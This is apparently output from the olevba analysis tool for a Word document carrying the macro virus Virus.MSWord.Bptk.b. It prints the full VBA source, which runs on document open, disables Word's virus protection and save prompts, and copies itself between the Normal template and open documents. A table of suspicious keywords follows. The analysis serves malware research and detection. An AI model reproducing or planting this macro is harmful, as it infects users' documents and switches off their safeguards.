olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.b-a18f82060524fe0b89543cbea26ff811b0047524
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.b-a18f82060524fe0b89543cbea26ff811b0047524 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'D
'
On Error Resume Next
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If N.Lines(3, 1) <> "'" Then
N.DeleteLines 1, N.CountOfLines
N.AddFromstring A.Lines(1, A.CountOfLines)
NormalTemplate.Save
ElseIf A.Lines(3, 1) <> "'" Then
A.DeleteLines 1, A.CountOfLines
A.AddFromstring N.Lines(1, N.CountOfLines)
ActiveDocument.Save
MsgBox "ÁÏÒÊ"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

